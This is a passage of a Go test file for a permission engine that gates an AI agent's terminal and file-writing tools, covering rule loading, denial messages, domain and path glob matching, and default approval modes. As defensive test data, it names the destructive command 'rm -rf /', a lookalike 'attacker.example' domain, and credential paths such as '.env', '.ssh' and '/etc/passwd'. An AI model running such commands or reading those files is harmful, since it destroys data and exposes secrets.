	if err := os.Remove(cfg); err != nil {
		t.Fatal(err)
	}
	e, err := New(cfg, "/work", ModeInteractive)
	if err != nil {
		t.Fatalf("New() after delete = %v, want nil", err)
	}
	if got := e.Check("terminal", map[string]any{"command": "rm -rf /"}); got != Deny {
		t.Errorf("New() after delete should NOT resurrect the deleted blanket allow, want default rule (Deny), got %s", got)
	}

	// The cache stays cleared even if the file comes back malformed.
	if err := os.WriteFile(cfg, []byte("not: valid: yaml: ["), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := New(cfg, "/work", ModeInteractive); err == nil {
		t.Error("New() with a malformed file and no live cache should error, not silently use the deleted config's rules")
	}
}

func TestLoadRules_RejectsMultipleClausesPerRule(t *testing.T) {
	yml := []byte(`
terminal:
  - allow: { pattern: "ls" }
    deny:  { pattern: "rm" }
`)
	if _, err := loadRules(yml); err == nil {
		t.Error("expected error when a rule sets both allow and deny")
	}
}

// ─── Denial reason ─────────────────────────────────────────────────────────

func TestDenialReason_IncludesRuleContext(t *testing.T) {
	e := newDefaultEngine(t)
	reason := e.DenialReason("terminal", map[string]any{"command": "rm -rf /"})
	if !strings.Contains(reason, "permission_denied") || !strings.Contains(reason, "rm -rf /") {
		t.Errorf("denial reason should reference pattern: %q", reason)
	}
}

// ─── Glob matching unit tests ──────────────────────────────────────────────

func TestGlobMatch_Semantics(t *testing.T) {
	cases := []struct {
		pattern, name string
		want          bool
	}{
		{"*.dev", "go.dev", true},
		{"*.dev", "foo.bar.dev", true}, // * matches across dots (standard glob)
		{"*", "foo", true},
		{"*", "foo.bar", true},
		{"github.com", "github.com", true},
		{"github.com", "raw.github.com", false},
		{"*.github.com", "raw.github.com", true},
		{"*.github.com", "a.b.github.com", true}, // * spans dots
		{"10.*", "10.0.0.1", true},               // private-range coverage
		{"192.168.*", "192.168.1.5", true},
		// Suffix anchor still enforced — attacker domain doesn't bypass.
		{"*.github.com", "github.com.attacker.example", false},
		{"github.com", "attacker.example", false},
	}
	for _, tc := range cases {
		if got := globMatch(tc.pattern, tc.name); got != tc.want {
			t.Errorf("globMatch(%q, %q) = %v, want %v", tc.pattern, tc.name, got, tc.want)
		}
	}
}

func TestPathMatch_DoubleGlob(t *testing.T) {
	cases := []struct {
		pattern, path string
		want          bool
	}{
		{"/work/**", "/work/src/main.go", true},
		{"/work/**", "/work/a/b/c/d.go", true},
		{"/work/**", "/work", true},
		{"/work/**", "/other/x.go", false},
		{"**/.env", "/work/myapp/.env", true},
		{"**/.env", "/work/.env", true},
		{"**/.ssh/**", "/home/u/.ssh/config", true},
		{"/etc/**", "/etc/passwd", true},
		{"/etc/**", "/var/etc/x", false},
	}
	for _, tc := range cases {
		if got := pathMatch(tc.pattern, tc.path); got != tc.want {
			t.Errorf("pathMatch(%q, %q) = %v, want %v", tc.pattern, tc.path, got, tc.want)
		}
	}
}

func TestExpandCWD(t *testing.T) {
	if got := expandCWD("$CWD/src/**", "/work"); got != "/work/src/**" {
		t.Errorf("expandCWD = %q", got)
	}
	if got := expandCWD("/etc/**", "/work"); got != "/etc/**" {
		t.Errorf("expandCWD should leave non-$CWD alone, got %q", got)
	}
}

func TestSignature_StableAcrossMapOrder(t *testing.T) {
	a := signature("t", "/work", map[string]any{"x": 1, "y": 2})
	b := signature("t", "/work", map[string]any{"y": 2, "x": 1})
	if a != b {
		t.Errorf("signature not stable: %q vs %q", a, b)
	}
}

// TestSignature_WriteFileNormalizesPathSpelling guards the write_file/
// edit_file remember key against two spellings of the same file producing
// different cache slots — the model might refer to the same path relatively
// in one call and absolutely in another within the same session.
func TestSignature_WriteFileNormalizesPathSpelling(t *testing.T) {
	rel := signature("write_file", "/work", map[string]any{"path": "src/main.go", "content": "v1"})
	abs := signature("write_file", "/work", map[string]any{"path": "/work/src/main.go", "content": "v2"})
	if rel != abs {
		t.Errorf("relative vs absolute spelling of the same file should share a cache slot: %q vs %q", rel, abs)
	}
}

// ─── Default mode resolution ───────────────────────────────────────────────

func writeGlobalPermissionMode(t *testing.T, mode string) {
	t.Helper()
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home) // Windows
	dir := filepath.Join(home, ".octo")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	body := ""
	if mode != "" {
		body = "permission_mode: " + mode + "\n"
	}
	if err := os.WriteFile(filepath.Join(dir, "config.yml"), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
}

func TestResolveUnattendedDefaultMode_UnsetFallsBackToAuto(t *testing.T) {
	writeGlobalPermissionMode(t, "")
	if got := ResolveUnattendedDefaultMode(); got != ModeAutoApprove {
		t.Errorf("unset global mode: got %s, want auto (cron has nobody to answer an ask)", got)
	}
	// The web/CLI/IM default differs deliberately: interactive, since a human
	// is normally present there.
	if got := ResolveDefaultMode(); got != ModeInteractive {
		t.Errorf("ResolveDefaultMode should stay interactive on unset, got %s", got)
	}
}

func TestResolveUnattendedDefaultMode_ExplicitConfigHonored(t *testing.T) {
	for _, mode := range []Mode{ModeInteractive, ModeStrict, ModeAutoApprove} {
		writeGlobalPermissionMode(t, string(mode))
		if got := ResolveUnattendedDefaultMode(); got != mode {
			t.Errorf("explicit %s should be honored, got %s", mode, got)
		}
	}
}
